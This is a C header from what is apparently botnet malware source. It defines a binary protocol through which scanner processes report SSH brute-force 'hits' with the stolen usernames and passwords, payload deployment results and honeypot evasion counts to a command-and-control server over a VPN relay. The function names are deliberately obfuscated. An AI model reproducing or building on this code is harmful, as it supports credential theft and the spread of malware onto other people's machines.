#pragma once

/*
 * Binary Scan Report Protocol
 *
 * Scanner children encode results as compact TLV binary messages,
 * buffered and flushed to the report pipe as base64 lines:
 *
 *   SR:<base64-encoded binary frames>\n
 *
 * Each binary frame: [type:1][len:2 BE][payload:len]
 *
 * The parent bot relays these lines as-is through the VPN.
 * The CNC detects the "SR:" prefix, base64-decodes, and parses
 * the concatenated TLV frames.
 *
 * This replaces verbose per-IP text messages with compact binary,
 * and suppresses miss/fail/honeypot/skip per-IP reporting entirely
 * (those become aggregate counts in the DONE stats).
 */

#include <stdint.h>

/* Message types */
#define SR_SSH_HIT         0x01  /* [ip:4][ulen:1][user:N][plen:1][pass:N] */
#define SR_SSH_DEPLOYED    0x02  /* [ip:4] */
#define SR_SSH_DEPLOY_FAIL 0x03  /* [ip:4] */
#define SR_SSH_PROGRESS    0x04  /* [current:4 BE][total:4 BE] */
#define SR_SSH_DONE        0x05  /* [total:4 BE][skip:2 BE][hp:2 BE][hp_probe:2 BE] */
#define SR_HTTP_HIT        0x10  /* [ip:4][status:2 BE] */
#define SR_HTTP_DONE       0x11  /* [total:4 BE][miss:4 BE][fail:4 BE] */

/* Init the report buffer; call once from child after fork */
void vC8Yg5i(int write_fd);

/* Flush buffered messages to the pipe as a single SR: line */
void ku8gj5o(void);

/* SSH messages */
void tP6Uf6v(uint32_t ip, const char *user, const char *pass);
void Da2yh8c(uint32_t ip);
void Tt8yX7B(uint32_t ip);
void Ux7my2G(uint32_t current, uint32_t total);
void yd7bZ4a(uint32_t total, uint16_t skipped, uint16_t honeypots, uint16_t hpots_probe);

/* HTTP messages */
void Mp8Qh2e(uint32_t ip, uint16_t status_code);
void mG4qi2p(uint32_t total, uint32_t misses, uint32_t fails);
